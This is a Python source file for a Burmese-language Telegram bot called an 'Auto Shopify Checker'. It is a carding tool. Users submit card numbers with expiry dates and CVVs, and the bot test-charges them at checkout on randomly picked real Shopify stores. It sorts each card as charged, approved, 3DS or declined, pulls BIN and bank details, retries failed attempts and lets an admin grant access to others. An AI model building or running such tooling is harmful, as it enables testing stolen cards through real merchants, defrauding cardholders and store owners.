import telebot
import asyncio
import aiohttp
import os
import random
from flask import Flask
from threading import Thread
import time

# api.py မှ လိုအပ်သော လုပ်ဆောင်ချက်များ
from api import process_card, parse_cc_string, extract_clean_response

# ==========================================
# CONFIGURATION & SECURITY
# ==========================================
BOT_TOKEN = os.environ.get("BOT_TOKEN")

if not BOT_TOKEN:
    print("Error: BOT_TOKEN ကို Render Environment တွင် မတွေ့ပါ။")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML", threaded=True)
app = Flask(__name__)

# အသုံးပြုခွင့်ရှိသူများ
ADMIN_ID = 1847021130
AUTHORIZED_USERS = {ADMIN_ID}

WORKING_KEYWORDS = [
    'card_declined', 'fraud', 'incorrect_zip', 'invalid_cvc', 'invalid_cvv',
    'insufficient_funds', 'otp_required', 'order_placed', 'declined',
    'do_not_honor', 'incorrect_number', 'card_incorrect', 'expired_card',
    'pickup_card', 'restricted_card', 'stolen_card', 'lost_card',
    'card_velocity_exceeded', 'transaction_not_allowed', 'invalid_expiry',
    'processing_error', 'call_issuer', 'try_again_later', 'fraudulent',
    'security_violation', 'blocked', 'bad_cvv', 'cvv_fail',
    'authentication_required', 'mismatched_bill', 'charged', 'approved',
    'wrong_number', 'incorrect number', 'card incorrect'
]

DEAD_KEYWORDS = [
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req', 'cloudflare', 
    'connection failed', 'timed out', 'access denied', 'site dead', 
    'captcha_required', 'captcha required', 'no_session_token',
    'generic_error', 'generic error', 'PAYMENTS_CREDIT_CARD_BASE_EXPIRED',
    'Failed to get session token'
]

# ==========================================
# ACCESS CONTROL
# ==========================================
def is_authorized(user_id):
    return user_id in AUTHORIZED_USERS

# ==========================================
# AUTO SITE PICKER
# ==========================================
def get_auto_site():
    try:
        with open("sites.txt", "r", encoding="utf-8") as f:
            sites = [line.strip() for line in f if line.strip()]
            if sites:
                return random.choice(sites)
    except Exception:
        pass
    return "https://paradoxbrewery.com"

# ==========================================
# HELPER FUNCTIONS
# ==========================================
async def get_bin_info(session, cc):
    try:
        bin6 = cc[:6]
        async with session.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5) as res:
            if res.status == 200:
                data = await res.json()
                return (
                    data.get('brand', 'UNKNOWN'),
                    data.get('bank', 'UNKNOWN'),
                    data.get('country_name', 'UNKNOWN'),
                    data.get('level', 'N/A'),
                    data.get('type', 'N/A'),
                    data.get('country_flag', '')
                )
    except:
        pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "N/A", "N/A", ""

def classify_result(success, message):
    msg = message.lower()
    if 'order_placed' in msg: return 'charged'
    if 'otp_required' in msg: return 'tds'
    if any(k in msg for k in ['approved', 'insufficient', 'cvv', 'cvc', 'zip', 'incorrect_zip', 'invalid_cvv', 'invalid_cvc', 'insufficient_funds']): return 'approved'
    if success: return 'declined'
    if any(kw in msg for kw in WORKING_KEYWORDS): return 'declined'
    if any(k in msg for k in DEAD_KEYWORDS): return 'error'
    return 'error'

def fmt_price(price, currency):
    try:
        if not price or price == '0': return "Free"
        return f"${float(price):.2f} {currency}"
    except:
        return f"${price} {currency}"

def fmt_info(brand, type_cc, level):
    if level and level != 'N/A':
        return f"{brand} - {type_cc.upper()} - {level.upper()}"
    return f"{brand} - {type_cc.upper()}"

async def run_with_retry(parts, site, proxy_str=None, max_retries=3):
    last_success, last_msg, last_gate, last_price, last_cur = False, 'ERROR', '', '0', 'USD'
    for attempt in range(max_retries):
        try:
            success, message, gateway, price, currency = await process_card(
                parts['cc'], parts['mes'], parts['ano'], parts['cvv'], site, None, proxy_str
            )
            category = classify_result(success, message)
            if category != 'error' or any(k in message.lower() for k in WORKING_KEYWORDS):
                return success, message, gateway, price, currency, category
            if any(kw in message.lower() for kw in DEAD_KEYWORDS):
                break
            if attempt < max_retries - 1: await asyncio.sleep(1)
        except Exception as e:
            last_msg = f"Error: {str(e)}"
            if attempt < max_retries - 1: await asyncio.sleep(1)
            else: break
    return last_success, last_msg, last_gate, last_price, last_cur, 'error'

# ==========================================
# ASYNC TASK RUNNER FOR TELEGRAM
# ==========================================
def run_async_task(chat_id, site, cc_string, msg_to_edit=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def process_task():
        try:
            parts = parse_cc_string(cc_string)
        except ValueError as e:
            if msg_to_edit:
                bot.edit_message_text(f"❌ <b>Format Error:</b> {e}", chat_id, msg_to_edit)
            return

        if not site.startswith('http'):
            site_url = 'https://' + site
        else:
            site_url = site

        async with aiohttp.ClientSession() as session:
            success, message, gateway, price, currency, category = await run_with_retry(parts, site_url)
            
            clean = extract_clean_response(message)
            if category == 'charged': clean = 'ORDER_PLACED'
            elif category == 'tds': clean = 'OTP_REQUIRED'
            
            brand, bank, country, level, type_cc, flag = await get_bin_info(session, parts['cc'])
            price_fmt = fmt_price(price, currency)
            info_str = fmt_info(brand, type_cc, level)

            status_map = {
                'charged': "🟢 <b>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥</b>",
                'approved': "🔵 <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</b>",
                'tds': "🟡 <b>𝟑𝐃𝐒 ❎</b>",
                'declined': "🔴 <b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝</b>",
                'error': "🟠 <b>𝐄𝐫𝐫𝐨𝐫</b>"
            }
            status_disp = status_map.get(category, "🟠 <b>𝐄𝐫𝐫𝐨𝐫</b>")

            # Developer Name ဖြုတ်ထားပါသည်
            final_text = (
                f"ア 𝐂𝐚𝐫𝐝 -» <code>{cc_string}</code>\n"
                f"カ 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status_disp}\n"
                f"ツ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» <b>{clean}</b>\n"
                f"キ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» <b>𝐀𝐮𝐭𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲</b>\n"
                f"千 𝐏𝐫𝐢𝐜𝐞 -» <b>{price_fmt}</b>\n"
                f"━━━━━━━━━━━━━\n"
                f"零 𝙄𝙣𝙛𝙤 -» {info_str}\n"
                f"零 𝘽𝙖𝙣𝙠 -» {bank}\n"
                f"零 𝘾𝙤𝙪𝗻𝘁𝗿𝐲 -» {country} {flag}\n"
                f"━━━━━━━━━━━━━"
            )

            if msg_to_edit:
                bot.edit_message_text(final_text, chat_id, msg_to_edit)
            else:
                bot.send_message(chat_id, final_text)

    loop.run_until_complete(process_task())
    loop.close()

# ==========================================
# BOT COMMANDS
# ==========================================
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "🚫 <b>ခွင့်ပြုချက်မရှိပါ။</b> ဤ Bot အား အသုံးပြုခွင့် မရှိပါ။")
        return
    bot.reply_to(message, "မင်္ဂလာပါ၊ Command များကို ကြည့်ရှုရန် /cmd ကိုနှိပ်ပါ။")

@bot.message_handler(commands=['cmd'])
def send_cmd(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "🚫 <b>ခွင့်ပြုချက်မရှိပါ။</b> ဤ Bot အား အသုံးပြုခွင့် မရှိပါ။")
        return
        
    text = (
        "<b>🔥 Auto Shopify Checker Bot 🔥</b>\n\n"
        "အသုံးပြုနည်း:\n"
        "<code>/chk 5275150060415544|05|27|803</code>\n\n"
        "<b>Admin Commands:</b>\n"
        "<code>/add UserID</code> (အခြားသူကို အသုံးပြုခွင့်ပေးရန်)\n"
        "<code>/rm UserID</code> (အသုံးပြုခွင့် ပြန်ပိတ်ရန်)"
    )
    bot.reply_to(message, text)

# --- ခွင့်ပြုချက်ပေးရန် / ပိတ်ရန် Commands များ (Admin သီးသန့်) ---
@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        new_user = int(message.text.split()[1])
        AUTHORIZED_USERS.add(new_user)
        bot.reply_to(message, f"✅ User ID <code>{new_user}</code> အား အသုံးပြုခွင့် ပေးလိုက်ပါပြီ။")
    except:
        bot.reply_to(message, "❌ <b>Format မှားနေပါသည်။</b>\nအသုံးပြုနည်း: <code>/add UserID</code>")

@bot.message_handler(commands=['rm'])
def remove_user(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        rm_user = int(message.text.split()[1])
        if rm_user == ADMIN_ID:
            bot.reply_to(message, "❌ Admin ကို ဖျက်၍မရပါ။")
            return
        AUTHORIZED_USERS.discard(rm_user)
        bot.reply_to(message, f"🚫 User ID <code>{rm_user}</code> အား အသုံးပြုခွင့် ပိတ်လိုက်ပါပြီ။")
    except:
        bot.reply_to(message, "❌ <b>Format မှားနေပါသည်။</b>\nအသုံးပြုနည်း: <code>/rm UserID</code>")

# --- Checker Command ---
@bot.message_handler(commands=['chk'])
def check_single(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "🚫 <b>ခွင့်ပြုချက်မရှိပါ။</b> ဤ Bot အား အသုံးပြုခွင့် မရှိပါ။")
        return

    args = message.text.split()
    
    # User က /chk cc|mm|yy|cvv သာ ထည့်ရမည်။ (Site လက်မခံတော့ပါ)
    if len(args) == 2:
        site = get_auto_site()
        cc_string = args[1]
    else:
        bot.reply_to(message, "❌ <b>အသုံးပြုနည်း မှားယွင်းနေပါသည်။</b>\nFormat: <code>/chk cc|mm|yy|cvv</code>")
        return

    msg = bot.reply_to(message, f"⏳ <b>Checking Card on {site}...</b>")
    Thread(target=run_async_task, args=(message.chat.id, site, cc_string, msg.message_id)).start()

# ==========================================
# WEB SERVER
# ==========================================
@app.route('/')
def index():
    return "Bot is running perfectly and secured!"

def run_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    Thread(target=run_server, daemon=True).start()
    print("Secured Bot Started...")
    bot.infinity_polling(timeout=20, long_polling_timeout=20)
